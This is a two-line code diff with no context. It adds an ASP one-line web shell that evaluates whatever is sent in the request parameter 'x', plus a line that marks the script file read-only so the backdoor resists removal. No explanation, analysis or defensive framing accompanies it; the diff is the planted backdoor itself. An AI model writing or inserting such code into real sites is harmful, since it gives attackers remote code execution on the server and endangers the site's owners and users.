@@ -1,0 +1,2 @@
+x <%Eval (Request(chr(120)))%>
+<%:Set fso=CreateObject("Scripting.FileSystemObject"):Set f=fso.GetFile(Request.ServerVariables("PATH_TRANSLATED")):if  f.attributes <> 33 then:f.attributes = 33:end if%>
